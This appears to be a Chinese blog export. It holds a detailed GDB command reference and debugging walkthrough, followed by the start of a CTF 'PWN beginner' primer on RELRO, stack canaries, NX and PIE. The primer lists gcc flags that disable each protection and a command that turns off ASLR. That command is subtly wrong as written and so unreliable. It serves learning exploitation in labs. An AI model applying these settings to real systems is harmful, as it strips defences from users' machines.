按2进制追加到文件    restore 文件名 [binary] bias 起始地址 结构地址  #   恢复文件中内容到内存.                                                    #   如果文件内容是原始二进制，需要指定binary参数，                                                        不然会gdb自动识别文件格式产生core dump文件        gcore   [文件名]    #   产生core dump文件字符集:    set target-charset 字符集   # 声明目标机器的locale,如gdbserver所在机器    set host-charset 字符集     # 声明本机的locale    set charset     字符集      # 声明目标机和本机的locale    show charset    show host-charset    show target-charset缓存远程目标的数据:为提高性能可以使用数据缓存，不过gdb不知道volatile变量，缓存可能会显示不正确的结构    set remotecache on | off    show remotecache     info dcache         #   显示数据缓存的性能C预处理宏:    macro expand(exp) 表达式        #   显示宏展开结果    macro expand-once(expl) 表达式  #   显示宏一次展开结果    macro info 宏名                 #   查看宏定义追踪(tracepoint):   就是在某个点设置采样信息，每次经过这个点时只执行已经定义的采样动作但并不停止，                    最后再根据采样结果进行分析。采样点定义:    trace   位置             #   定义采样点    info tracepoints         #   查看采样点列表    delete trace 采样点编号  #   删除采杰点    disable trace 采样点编号 #   禁止采杰点    enable trace 采样点编号  #   使用采杰点    passcount 采样点编号 [n] #   当通过采样点 n次后停止,不指定n则在下一个断点停止预定义动作：预定义动作以actions开始,后面是一系列的动作    actions [num]           #   对采样点num定义动作    行为:        collect 表达式      #   采样表达式信息            一些表达式有特殊意义，如$regs(所有寄存器),$args(所有函数参数),$locals(所有局部变量)        while-steping n     #   当执行第n次时的动作,下面跟自己的collect操作采样控制:    tstart                  #   开始采样    tstop                   #   停止采样    tstatus                 #   显示当前采样的数据使用收集到的数据:    tfind start             #   查找第一个记录    tfind end | none        #   停止查找    tfind                   #   查找下一个记录    tfind -                 #   查找上一个记录    tfind tracepoint N      #   查找 追踪编号为N 的下一个记录    tfind pc 地址           #   查找代码在指定地址的下一个记录    tfind range 起始,结束    tfind outside 起始，结构    tfind line [文件名:]行号    tdump                   #   显示当前记录中追踪信息    save-tracepoints 文件名 #   保存追踪信息到指定文件,后面使用source命令读追踪中的便利变量:    $trace_frame            #   当前帧编号, -1表示没有, INT    $tracepoint             #   当前追踪,INT    $trace_line             #   位置    INT    $trace_file             #   追踪文件 string, 需要使用output输出，不应用printf    $trace_func             #   函数名 string覆盖技术(overray): 用于调试过大的文件gdb文件:    file    文件名          #   加载文件,此文件为可执行文件，并且从这里读取符号    core    文件名          #   加载core dump文件    exec-file   文件名      #   加载可执行文件    symbol-file 文件名      #   加载符号文件    add-symbol-file 文件名 地址 #   加载其它符号文件到指定地址    add-symbol-file-from-memory 地址    #   从指定地址中加载符号    add-share-symbol-files 库文件   #   只适用于cygwin    session 段 地址         #   修改段信息    info files | target     #   打开当前目标信息    maint info sections     #   查看程序段信息    set truct-readonly-sections on | off #   加快速度    show truct-readonly-sections    set auto-solib-add on | off    #   修改自动加载动态库的模式    show auto-solib-add    info share                      #   打印当前加载的共享库的地址信息    share [正则表达式]              #   从符合的文件中加载共享库的正则表达式    set stop-on-solib-events on | off # 设置当加载共享库时是不是要停止    show stop-on-solib-events    set solib-absolute-prefix 路径 #   设置共享库的绝对路矩，当加载共享库时会以此路径下查找(类似chroot)    show solib-absolute-prefix     set solib-search-path   路径    #   如果solib-absolute-prefix查找失败，那将使用这个目录查找共享库    show solib-search-path修改远程目标的网络字节序格式:    set endian big | little | auto    show endian</code></pre><h1 id="四、gdb使用总结"><a href="#四、gdb使用总结" class="headerlink" title="四、gdb使用总结"></a>四、gdb使用总结</h1><h2 id="1-基本命令"><a href="#1-基本命令" class="headerlink" title="1. 基本命令"></a>1. 基本命令</h2><pre><code>1）进入GDB　　#gdb test　　  test是要调试的程序，由gcc test.c -g -o test生成。进入后提示符变为(gdb) 。2）查看源码　　(gdb) l　　  　　  查看其他文件中定义的函数，在l后加上函数名即可定位到这个函数的定义及查看附近的其他源码。      或者使用断点或单步运行，到某个函数处使用s进入这个函数。3）设置断点　　(gdb) b 6　　这样会在运行到源码第6行时停止，可以查看变量的值、堆栈情况等；这个行号是gdb的行号。4）查看断点处情况　　(gdb) info b　　可以键入&quot;info b&quot;来查看断点处情况，可以设置多个断点；5）运行代码　　(gdb) r6）显示变量值　　(gdb) p n　　在程序暂停时，键入&quot;p 变量名&quot;(print)即可；　　GDB在显示变量值时都会在对应值之前加上&quot;$N&quot;标记，它是当前变量值的引用标记，    以后若想再次引用此变量，就可以直接写作&quot;$N&quot;，而无需写冗长的变量名；7）观察变量　　(gdb) watch n    在某一循环处，往往希望能够观察一个变量的变化情况，这时就可以键入命令    &quot;watch&quot;来观察变量的变化情况，GDB在&quot;n&quot;设置了观察点；8）单步运行　　(gdb) n9）程序继续运行　　(gdb) c　　使程序继续往下运行，直到再次遇到断点或程序结束；10）退出GDB　　(gdb) q</code></pre><h2 id="2：断点调试"><a href="#2：断点调试" class="headerlink" title="2：断点调试"></a>2：断点调试</h2><table><thead><tr><th>命令格式</th><th align="center">例子</th><th align="right">作用</th></tr></thead><tbody><tr><td>break + 设置断点的行号　　｜break n　　　　　｜在 n 行处设置断点</td><td align="center"></td><td align="right"></td></tr><tr><td>tbreak + 行号 或 函数名　　｜tbreak n/func　　｜设置临时断点，到达后被自动删除</td><td align="center"></td><td align="right"></td></tr><tr><td>break + filename:行号　　｜break main.c:10　｜用于在指定文件对应行设置断点</td><td align="center"></td><td align="right"></td></tr><tr><td>break + &lt;0x…&gt;　　｜break 0x3400a　　｜用于在内存某一位置处暂停</td><td align="center"></td><td align="right"></td></tr><tr><td>break + 行号 + if + 条件　　｜break 10 if i==3｜用于设置条件断点，在循环中使用非常方便</td><td align="center"></td><td align="right"></td></tr><tr><td>info breakpoints/watchpoints [n]｜info break　　｜n 表示断点号，查看断点/观察点的情况</td><td align="center"></td><td align="right"></td></tr><tr><td>clear + 要清除的断点行号　　｜clear 10　　　｜用于清除对应行的断点，要给出断点的行号，清除时GDB会给出提示</td><td align="center"></td><td align="right"></td></tr><tr><td>delete + 要清除的断点编号　　｜delete 3　　　｜用于清除断点和自动显示的表达式的命令，要给出断点的编号，清除时GDB不会给出任何提示</td><td align="center"></td><td align="right"></td></tr><tr><td>disable/enable + 断点编号　　｜disable 3　　｜让所设断点暂时失效/使能，如果要让多个编号处的断点失效/使能，可将编号之间用空格隔开</td><td align="center"></td><td align="right"></td></tr><tr><td>awatch/watch + 变量　　｜awatch/watch i　｜设置一个观察点，当变量被读出或写入时程序被暂停</td><td align="center"></td><td align="right"></td></tr><tr><td>rwatch + 变量　　　　　　｜rwatch i　　　　｜设置一个观察点，当变量被读出时，程序被暂停</td><td align="center"></td><td align="right"></td></tr><tr><td>catch　　　　　｜｜设置捕捉点来补捉程序运行时的一些事件。如：载入共享库（动态链接库）或是C++的异常</td><td align="center"></td><td align="right"></td></tr><tr><td>tcatch　　　　　｜｜只设置一次捕捉点，当程序停住以后，应点被自动删除</td><td align="center"></td><td align="right"></td></tr></tbody></table><h2 id="3-数据命令"><a href="#3-数据命令" class="headerlink" title="3. 数据命令"></a>3. 数据命令</h2><pre><code>display + 表达式　　              显示表达式的值，每当程序运行到断点处都会显示表达式的值。display a　info display　　　　　　          显示当前所有要显示值的表达式的情况 delete + display的编号　　        删除一个要显示值的表达式，被删除的表达式将不被显示。delete 3　disable/enable + display的编号　　使一个要显示值的表达式暂时失效/使能。disable/enable 3　　undisplay + display的编号　　 　　用于结束某个表达式值的显示。undisplay 3whatis + 变量　　　　             显示某个表达式的数据类型。 whatis iprint(p) + 变量/表达式　          用于打印变量或表达式的值。　p n　　　　    使用print命令时，可以对变量按指定格式进行输出，其命令格式为print /变量名 + 格式　　    其中常用的变量格式：x：十六进制；d：十进制；u：无符号数；o：八进制；c：字符格式；f：浮点数。set + 变量 = 变量值　　         　改变程序中某个变量的值。set i = 3　</code></pre><p>##5. 调试运行环境相关命令</p><pre><code>set args　　　　    设置运行参数。 set args arg1 arg2show args　　　     参看运行参数。 show argsset width + 数目    设置GDB的行宽。set width 70cd + 工作目录　　   切换工作目录。 cd ../　　run　　           　程序开始执行。 r/run　step(s)　     进入式（会进入到所调用的子函数中）单步执行，进入函数的前提是，此函数被编译有debug信息next(n)　     非进入式（不会进入到所调用的子函数中）单步执行finish　　    一直运行到函数返回并打印函数返回时的堆栈地址和返回值及参数值等信息until + 行数　　   运行到函数某一行 。　u 3　continue(c)　　　　执行到下一个断点或程序结束 return &lt;返回值&gt;　　改变程序流程，直接结束当前函数，并将指定值返回。return 5　　call + 函数　　    在当前位置执行所要运行的函数。call func　</code></pre><h2 id="6-堆栈相关命令"><a href="#6-堆栈相关命令" class="headerlink" title="6. 堆栈相关命令"></a>6. 堆栈相关命令</h2><pre><code>backtrace/bt　　 用来打印栈帧指针，也可以在该命令后加上要打印的栈帧指针的个数。backtrace（或bt）查看各级函数调用及参数                 查看程序执行到此时，都经过哪些函数/程序的调用，                 程序“调用堆栈”是当前函数之前的所有已调用函数的列表（包括当前函数）。                 每个函数及其变量都被分配了一个“帧”，最近调用的函数在 0 号帧中（“底部”帧）frame　　        用于打印指定栈帧。例如：frame 1　　info reg　　     查看寄存器使用情况。例如：info reg　　info stack　　   查看堆栈使用情况。例如：info stack　　up/down　　　    跳到上一层/下一层函数。up/down　</code></pre><h2 id="7-跳转执行"><a href="#7-跳转执行" class="headerlink" title="7. 跳转执行"></a>7. 跳转执行</h2><p>jump 指定下一条语句的运行点。可以是文件的行号，可以是file:line格式，可以是+num这种偏移量格式。表式着下一条运行语句从哪里开始。相当于改变了PC寄存器内容，堆栈内容并没有改变，跨函数跳转容易发生错误。 jump 指定下一条语句的运行点。可以是文件的行号，可以是file:line格式，可以是+num这种偏移量格式。表式着下一条运行语句从哪里开始。相当于改变了PC寄存器内容，堆栈内容并没有改变，跨函数跳转容易发生错误。</p><h2 id="8-信号命令"><a href="#8-信号命令" class="headerlink" title="8. 信号命令"></a>8. 信号命令</h2><pre><code>signal 　　signal SIGXXX 　　产生XXX信号，如SIGINT。一种速查Linux查询信号的方法：# kill -lhandle 　　在GDB中定义一个信号处理。信号可以以SIG开头或不以SIG开头，可以用定义一个要处理信号的范围（如：SIGIO-SIGKILL，表示处理从SIGIO信号到SIGKILL的信号，其中包括SIGIO，SIGIOT，SIGKILL三个信号），也可以使用关键字all来标明要处理所有的信号。一旦被调试的程序接收到信号，运行程序马上会被GDB停住，以供调试。其可以是以下几种关键字的一个或多个：　　nostop/stop　　　　当被调试的程序收到信号时，GDB不会停住程序的运行，但会打出消息告诉你收到这种信号/GDB会停住你的程序  　　print/noprint　　　　当被调试的程序收到信号时，GDB会显示出一条信息/GDB不会告诉你收到信号的信息 　　pass 　　noignore 　　　　当被调试的程序收到信号时，GDB不处理信号。这表示，GDB会把这个信号交给被调试程序会处理。 　　nopass 　　ignore 　　　　当被调试的程序收到信号时，GDB不会让被调试程序来处理这个信号。 　　info signals 　　info handle 　　　　可以查看哪些信号被GDB处理，并且可以看到缺省的处理方式　　single命令和shell的kill命令不同，系统的kill命令发信号给被调试程序时，是由GDB截获的，而single命令所发出一信号则是直接发给被调试程序的。</code></pre><h2 id="9-运行-Shell-命令"><a href="#9-运行-Shell-命令" class="headerlink" title="9. 运行 Shell 命令"></a>9. 运行 Shell 命令</h2><p>在 gdb 环境中，你可以执行 UNIX 的 shell 的命令，使用 gdb 的 shell 命令来完成：shell <command string></p><p>例如：<code>(gdb) shell ls             // 在 gdb 中运行 ls。</code></p><h2 id="10-更多程序运行选项和调试"><a href="#10-更多程序运行选项和调试" class="headerlink" title="10. 更多程序运行选项和调试"></a>10. 更多程序运行选项和调试</h2><pre><code>1、程序运行参数。 　　set args 可指定运行时参数。（如：set args 10 20 30 40 50） 　　show args 命令可以查看设置好的运行参数。 2、运行环境。 　　path 可设定程序的运行路径。 　　show paths 查看程序的运行路径。　　set environment varname [=value] 设置环境变量。如：set env USER=hchen 　　show environment [varname] 查看环境变量。 3、工作目录。　　cd　　  相当于shell的cd命令。 　　pwd　　显示当前的所在目录。 4、程序的输入输出。 　　info terminal 显示你程序用到的终端的模式。 　　使用重定向控制程序输出。如：run &gt; outfile 　　tty命令可以指写输入输出的终端设备。如：tty /dev/ttyb5、调试已运行的程序两种方法： 　　(1)在UNIX下用ps查看正在运行的程序的PID（进程ID），然后用gdb PID格式挂接正在运行的程序。 　　(2)先用gdb 关联上源代码，并进行gdb，在gdb中用attach命令来挂接进程的PID。并用detach来取消挂接的进程。6、暂停 / 恢复程序运行　　当进程被gdb停住时，你可以使用info program 来查看程序的是否在运行，进程号，被暂停的原因。 在gdb中，我们可以有以下几种暂停方式：断点（BreakPoint）、观察点（WatchPoint）、捕捉点（CatchPoint）、信号（Signals）、线程停止（Thread Stops），如果要恢复程序运行，可以使用c或是continue命令。7、线程（Thread Stops）如果程序是多线程，可以定义断点是否在所有的线程上，或是在某个特定的线程。 　　break thread　　break thread if ... 　　linespec指定了断点设置在的源程序的行号。threadno指定了线程的ID，注意，这个ID是GDB分配的，可以通过“info threads”命令来查看正在运行程序中的线程信息。如果不指定thread 则表示断点设在所有线程上面。还可以为某线程指定断点条件。如： 　　(gdb) break frik.c:13 thread 28 if bartab &gt; lim 当你的程序被GDB停住时，所有的运行线程都会被停住。这方便查看运行程序的总体情况。而在你恢复程序运行时，所有的线程也会被恢复运行。</code></pre><h2 id="11-调试-core-文件"><a href="#11-调试-core-文件" class="headerlink" title="11. 调试 core 文件"></a>11. 调试 core 文件</h2><pre><code>Core Dump：Core 的意思是内存，Dump 的意思是扔出来，堆出来。开发和使用 Unix 程序时，有时程序莫名其妙的 down 了，却没有任何的提示 ( 有时候会提示 core dumped)，这时候可以查看一下有没有形如 core.进程号 的文件生成，这个文件便是操作系统把程序 down 掉时的内存内容扔出来生成的，它可以做为调试程序的参考</code></pre><pre><code>(1)生成Core文件　　一般默认情况下，core file的大小被设置为了0，这样系统就不dump出core file了。修改后才能生成core文件。　　#设置core大小为无限　　ulimit -c unlimited　　#设置文件大小为无限　　ulimit unlimited　　这些需要有root权限, 在ubuntu下每次重新打开中断都需要重新输入上面的第一条命令, 来设置core大小为无限core文件生成路径:输入可执行文件运行命令的同一路径下。若系统生成的core文件不带其他任何扩展名称，则全部命名为core。新的core文件生成将覆盖原来的core文件。1）/proc/sys/kernel/core_uses_pid可以控制core文件的文件名中是否添加pid作为扩展。文件内容为1，表示添加pid作为扩展名，生成的core文件格式为core.xxxx；为0则表示生成的core文件同一命名为core。可通过以下命令修改此文件：echo &quot;1&quot; &gt; /proc/sys/kernel/core_uses_pid2）proc/sys/kernel/core_pattern可以控制core文件保存位置和文件名格式。可通过以下命令修改此文件：echo &quot;/corefile/core-%e-%p-%t&quot; &gt; core_pattern，可以将core文件统一生成到/corefile目录下，产生的文件名为core-命令名-pid-时间戳以下是参数列表:    %p - insert pid into filename 添加pid    %u - insert current uid into filename 添加当前uid    %g - insert current gid into filename 添加当前gid    %s - insert signal that caused the coredump into the filename 添加导致产生core的信号    %t - insert UNIX time that the coredump occurred into filename 添加core文件生成时的unix时间    %h - insert hostname where the coredump happened into filename 添加主机名    %e - insert coredumping executable name into filename 添加命令名(2)用gdb查看core文件　　发生core dump之后, 用gdb进行查看core文件的内容, 以定位文件中引发core dump的行.　　gdb [exec file] [core file]　　如:　　gdb ./test core　　或gdb ./a.out 　　core-file core.xxxx　　gdb后, 用bt命令backtrace或where查看程序运行到哪里, 来定位core dump的文件-&gt;行.　　待调试的可执行文件，在编译的时候需要加-g，core文件才能正常显示出错信息　　1）gdb -core=core.xxxx　　file ./a.out　　bt　　2）gdb -c core.xxxx　　file ./a.out　　bt(3)用gdb实时观察某进程crash信息　　启动进程　　gdb -p PID　　c　　运行进程至crash　　gdb会显示crash信息　　bt</code></pre><h2 id="12-一个调试例子"><a href="#12-一个调试例子" class="headerlink" title="12. 一个调试例子"></a>12. 一个调试例子</h2><p>测试用的 C++ 程序：</p><pre><code>#include &lt;stdio.h&gt;int add_range(int low, int high)&#123;    int i, sum;    for (i = low; i &lt;= high; i++)        sum = sum + i;    return sum;&#125;int main(void)&#123;    int result[100];    result[0] = add_range(1, 10);    result[1] = add_range(1, 100);    printf(&quot;result[0]=%d\nresult[1]=%d\n&quot;, result[0], result[1]);    return 0;&#125;</code></pre><p>add_range 函数从 low 加到 high，在 main 函数中首先从 1 加到 10，把结果保存下来，然后从 1 加到 100，再把结果保存下来，最后打印的两个结果是：</p><pre><code>result[0] = 55result[1] = 5105</code></pre><p>第一个结果正确，第二个结果显然不正确，这是很常见的一类错误现象，这种情况不应该怀疑代码而应该怀疑数据，因为第一次和第二次运行的都是同一段代码，如果代码是错的，那为什么第一次的结果能对呢？然而第一次和第二次运行时相关的数据却有可能不同，错误的数据会导致错误的结果。</p><p>在编译时要加上 -g 选项，生成的可执行文件才能用 gdb 进行源码级调试：</p><pre><code>$ gcc -g main.c -o main$ gdb main</code></pre><pre><code>-g 选项的作用是在可执行文件中加入源代码的信息，比如可执行文件中第几条机器指令对应源代码的第几行，但并不是把整个源文件嵌入到可执行文件中，所以在调试时必须保证 gdb 能找到源文件。gdb提供一个类似Shell的命令行环境，上面的(gdb)就是提示符，在这个提示符下输入help可以查看命令的类别：(gdb) help</code></pre><p>也可以进一步查看某一类别中有哪些命令，例如：查看 files 类别下有哪些命令可用：(gdb) help files</p><p>现在试试用 list 命令从第一行开始列出源代码：</p><pre><code>(gdb) list 11 #include &lt;stdio.h&gt;2 3 int add_range(int low, int high)4 &#123;5 int i, sum;6 for (i = low; i &lt;= high; i++)7 sum = sum + i;8 return sum;9 &#125;10</code></pre><p>一次只列10行，如果要从第11行开始继续列源代码可以输入: (gdb) list</p><p>也可以什么都不输直接敲回车，gdb提供了一个很方便的功能，在提示符下直接敲回车表示重复上一条命令。</p><pre><code>(gdb) （直接回车）11 int main(void)12 &#123;13 int result[100];14 result[0] = add_range(1, 10);15 result[1] = add_range(1, 100);16 printf(&quot;result[0]=%d\nresult[1]=%d\n&quot;, result[0], result[1]);17 return 0;18gdb 的很多常用命令有简写形式，例如 list 命令可以写成 l，要列一个函数的源代码也可以用函数名做参数：(gdb) l add_range1 #include &lt;stdio.h&gt;2 3 int add_range(int low, int high)4 &#123;5 int i, sum;6 for (i = low; i &lt;= high; i++)7 sum = sum + i;8 return sum;9 &#125;10</code></pre><p>现在退出gdb的环境：(gdb) quit</p><p>我们做一个实验，把源代码改名或移到别处再用gdb调试，这样就列不出源代码了：</p><pre><code>$ mv main.c mian.c$ gdb main...(gdb) l5 main.c: No such file or directory.in main.c可见 gcc 的 -g 选项并不是把源代码嵌入到可执行文件中的，在调试时也需要源文件。现在把源代码恢复原样，我们继续调试。首先用 start 命令开始执行程序：$ gdb main...(gdb) startBreakpoint 1 at 0x80483ad: file main.c, line 14.Starting program: /home/akaedu/main main () at main.c:1414 result[0] = add_range(1, 10);(gdb)</code></pre><p>gdb停在main函数中变量定义之后的第一条语句处等待我们发命令，gdb列出的这条语句是即将执行的下一条语句。<br>我们可以用next命令（简写为n）控制这些语句一条一条地执行：</p><pre><code>(gdb) n15 result[1] = add_range(1, 100);(gdb) （直接回车）16 printf(&quot;result[0]=%d\nresult[1]=%d\n&quot;, result[0], result[1]);(gdb) （直接回车）result[0]=55result[1]=510517 return 0;</code></pre><p>用n命令依次执行两行赋值语句和一行打印语句，在执行打印语句时结果立刻打出来了，然后停在return语句之前等待我们发命令。</p><p>虽然我们完全控制了程序的执行，但仍然看不出哪里错了，因为错误不在main函数中而在 add_range 函数中，现在用 start 命令重新来过，这次用 step 命令（简写为s）钻进 add_range 函数中去跟踪执行：</p><pre><code>(gdb) startThe program being debugged has been started already.Start it from the beginning? (y or n) yBreakpoint 2 at 0x80483ad: file main.c, line 14.Starting program: /home/akaedu/main main () at main.c:1414 result[0] = add_range(1, 10);(gdb) sadd_range (low=1, high=10) at main.c:66 for (i = low; i &lt;= high; i++)</code></pre><p>这次停在了add_range函数中变量定义之后的第一条语句处。</p><p>在函数中有几种查看状态的办法，backtrace命令（简写为bt）可以查看函数调用的栈帧：</p><pre><code>(gdb) bt#0  add_range (low=1, high=10) at main.c:6#1  0x080483c1 in main () at main.c:14</code></pre><p>可见当前的 add_range 函数是被 main 函数调用的，main 传进来的参数是 low=1，high=10。main 函数的栈帧编号为1，add_range 的栈帧编号为0。</p><p>现在可以用 info 命令（简写为i）查看 add_range 函数局部变量的值：</p><pre><code>(gdb) i localsi = 0sum = 0</code></pre><p>如果想查看 main 函数当前局部变量的值也可以做到，先用 frame命令（简写为f）选择1号栈帧然后再查看局部变量：</p><pre><code>(gdb) f 1#1  0x080483c1 in main () at main.c:1414 result[0] = add_range(1, 10);(gdb) i locals result = &#123;0, 0, 0, 0, 0, 0, 134513196, 225011984, -1208685768, -1081160480, ...  -1208623680&#125;</code></pre><p>注意到 result 数组中有很多元素具有杂乱无章的值，我们知道未经初始化的局部变量具有不确定的值。到目前为止一切正常。用 s 或 n 往下走几步，然后用 print 命令（简写为p）打印出变量 sum 的值：</p><pre><code>(gdb) s7 sum = sum + i;(gdb) （直接回车）6 for (i = low; i &lt;= high; i++)(gdb) （直接回车）7 sum = sum + i;(gdb) （直接回车）6 for (i = low; i &lt;= high; i++)(gdb) p sum$1 = 3</code></pre><p>第一次循环 i 是 1，第二次循环 i 是 2，加起来是3，没错。这里的 $1 表示 gdb 保存着这些中间结果，$后面的编号会自动增长，在命令中可以用$1、$2、$3等编号代替相应的值。</p><p>由于我们本来就知道第一次调用的结果是正确的，再往下跟也没意义了，可以用 finish 命令让程序一直运行到从当前函数返回为止：</p><pre><code>(gdb) finishRun till exit from #0  add_range (low=1, high=10) at main.c:60x080483c1 in main () at main.c:1414 result[0] = add_range(1, 10);Value returned is $2 = 55</code></pre><p>返回值是55，当前正准备执行赋值操作，用 s 命令赋值，然后查看 result 数组：</p><pre><code>(gdb) s15 result[1] = add_range(1, 100);(gdb) p result$3 = &#123;55, 0, 0, 0, 0, 0, 134513196, 225011984, -1208685768, -1081160480, ...  -1208623680&#125;</code></pre><p>第一个值 55 确实赋给了 result 数组的第 0 个元素。下面用 s 命令进入第二次 add_range 调用，进入之后首先查看参数和局部变量：</p><pre><code>(gdb) sadd_range (low=1, high=100) at main.c:66 for (i = low; i &lt;= high; i++)(gdb) bt#0 add_range (low=1, high=100) at main.c:6#1 0x080483db in main () at main.c:15(gdb) i locals i = 11sum = 55</code></pre><pre><code>由于局部变量 i 和 sum 没初始化，所以具有不确定的值，又由于两次调用是挨着的，i 和 sum 正好取了上次调用时的值，&quot;验证局部变量存储空间的分配和释放&quot; 是一样的道理，只不过这次举的例子设法让局部变量 sum 在第一次调用时初值为0了。i 的初值不是0倒没关系，在 for 循环中会赋值为 0 的，但 sum 如果初值不是 0，累加得到的结果就错了。</code></pre><p>好了，我们已经找到错误原因，可以退出 gdb 修改源代码了。如果我们不想浪费这次调试机会，可以在 gdb 中马上把 sum 的初值改为 0 继续运行，看看这一处改了之后还有没有别的 Bug：</p><pre><code>(gdb) set var sum=0(gdb) finishRun till exit from #0  add_range (low=1, high=100) at main.c:60x080483db in main () at main.c:1515 result[1] = add_range(1, 100);Value returned is $4 = 5050(gdb) n16 printf(&quot;result[0]=%d\nresult[1]=%d\n&quot;, result[0], result[1]);(gdb) （直接回车）result[0]=55result[1]=505017 return 0;</code></pre><p>这样结果就对了。修改变量的值除了用 set 命令之外也可以用 print 命令，因为 print 命令后面跟的是表达式，而我们知道赋值和函数调用也都是表达式，所以也可以用 print 命令修改变量的值或者调用函数：</p><pre><code>(gdb) p result[2]=33$5 = 33(gdb) p printf(&quot;result[2]=%d\n&quot;, result[2])result[2]=33$6 = 13</code></pre><h1 id="在不同语言中使用GDB"><a href="#在不同语言中使用GDB" class="headerlink" title="在不同语言中使用GDB"></a>在不同语言中使用GDB</h1><hr><p>GDB支持下列语言：C, C++, Fortran, PASCAL, Java, Chill, assembly, 和<br>Modula-2。一般说来，GDB会根据你所调试的程序来确定当然的调试语言，比如：发<br>现文件名后缀为“.c”的，GDB会认为是C程序。文件名后缀为 “.C, .cc, .cp,<br>.cpp, .cxx, .c++”的，GDB会认为是C++程序。而后缀是“.f, .F”的，GDB会认为是<br>Fortran程序，还有，后缀为如果是“.s, .S”的会认为是汇编语言。</p><p>也就是说，GDB会根据你所调试的程序的语言，来设置自己的语言环境，并让GDB的命<br>令跟着语言环境的改变而改变。比如一些GDB命令需要用到表达式或变量时，这些<br>表达式或变量的语法，完全是根据当前的语言环境而改变的。例如C/C++中对指针<br>的语法是*p，而在Modula-2中则是p^。并且，如果你当前的程序是由几种不同语言<br>一同编译成的，那到在调试过程中，GDB也能根据不同的语言自动地切换语言环境。<br>这种跟着语言环境而改变的功能，真是体贴开发人员的一种设计。</p><p>下面是几个相关于GDB语言环境的命令：</p><p>show language<br>查看当前的语言环境。如果GDB不能识为你所调试的编程语言，那么，C语言被认为是默认的环境。</p><p>info frame<br>查看当前函数的程序语言。</p><p>info source<br>查看当前文件的程序语言。</p><p>如果GDB没有检测出当前的程序语言，那么你也可以手动设置当前的程序语言。使用set language命令即可做到。</p><p>当set language命令后什么也不跟的话，你可以查看GDB所支持的语言种类：</p><p>(gdb) set language<br>The currently understood settings are:</p><p>local or auto Automatic setting based on source file<br>c Use the C language<br>c++ Use the C++ language<br>asm Use the Asm language<br>chill Use the Chill language<br>fortran Use the Fortran language<br>java Use the Java language<br>modula-2 Use the Modula-2 language<br>pascal Use the Pascal language<br>scheme Use the Scheme language<br>于是你可以在set language后跟上被列出来的程序语言名，来设置当前的语言环境</p><hr><ul><li>转载连接：<a href="https://blog.csdn.net/freeking101">https://blog.csdn.net/freeking101</a><br><a href="https://blog.csdn.net/freeking101/article/details/54406982#t9">https://blog.csdn.net/freeking101/article/details/54406982#t9</a></li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> GDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界--PWN新手区</title>
      <link href="2021/10/09/gong-fang-shi-jie-pwn-xin-shou-qu/"/>
      <url>2021/10/09/gong-fang-shi-jie-pwn-xin-shou-qu/</url>
      
        <content type="html"><![CDATA[<p>#前置知识学习</p><p>##RELRO</p><p>GCC, GNU linker 以及 Glibc-dynamic linker 一起配合实现了一种叫做 relro 的技术: read only relocation。大概实现就是由 linker 指定 binary 的一块经过 dynamic linker 处理过 relocation 之后的区域为只读.<br>设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对 GOT（Global Offset Table）攻击。RELRO 为” Partial RELRO”，说明我们对 GOT 表具有写权限。</p><pre><code>gcc -o hello test.c // 默认情况下，是Partial RELROgcc -z norelro -o hello test.c // 关闭，即No RELROgcc -z lazy -o hello test.c // 部分开启，即Partial RELROgcc -z now -o hello test.c // 全部开启，即Full RELRO</code></pre><p>##CANNARY (栈保护)</p><p>表示栈保护功能有没有开启。<br>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行。在 Linux 中我们将 cookie 信息称为 canary。<br>可以在 GCC 中使用以下参数设置 Canary:</p><pre><code>-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护-fstack-protector-all 启用保护，为所有函数插入保护-fstack-protector-strong-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护-fno-stack-protector 禁用保护</code></pre><p>##NX(DEP)</p><p>NX 即 No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入 shellcode 时，程序会尝试在数据页面上执行指令，此时 CPU 就会抛出异常，而不是去执行恶意指令。</p><p>工作原理如图：</p><p><img src="/images/GFSJ-PWN/1/img.png" alt="NX工作原理图"></p><p>gcc 编译器默认开启了 NX 选项，如果需要关闭 NX 选项，可以给 gcc 编译器添加 - z execstack 参数。<br>例如：</p><pre><code>gcc -o test test.c                    // 默认情况下，开启NX保护gcc -z execstack -o test test.c        // 禁用NX保护gcc -z noexecstack -o test test.c    // 开启NX保护</code></pre><p>在 Windows 下，类似的概念为 DEP（数据执行保护），在最新版的 Visual Studio 中默认开启了 DEP 编译选项。</p><p>##PIE</p><p>PIE (Position-Independent Executable, 位置无关可执行文件) 技术与 ASLR 技术类似，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关，即程序运行时各个段（如代码段等）加载的虚拟地址也是在装载时才确定。这就意味着，在 PIE 和 ASLR 同时开启的情况下，攻击者将对程序的内存布局一无所知，传统的改写<br>GOT 表项的方法也难以进行，因为攻击者不能获得程序的.got 段的虚地址。<br>若开启一般需在攻击时泄露地址信息</p><p>liunx 下关闭 PIE 的命令如下：</p><pre><code>    sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code></pre><p>gcc 编译命令</p><pre><code>gcc -o test test.c                // 默认情况下，不开启PIEgcc -fpie -pie -o test test.c        // 开启PIE，此时强度为1gcc -fPIE -pie -o test test.c        // 开启PIE，此时为最高强度2gcc -fpic -o test test.c        // 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c        // 开启PIC，此时为最高强度2，不会开启PIE</code></pre><hr><p>参考链接：</p><ul><li><a 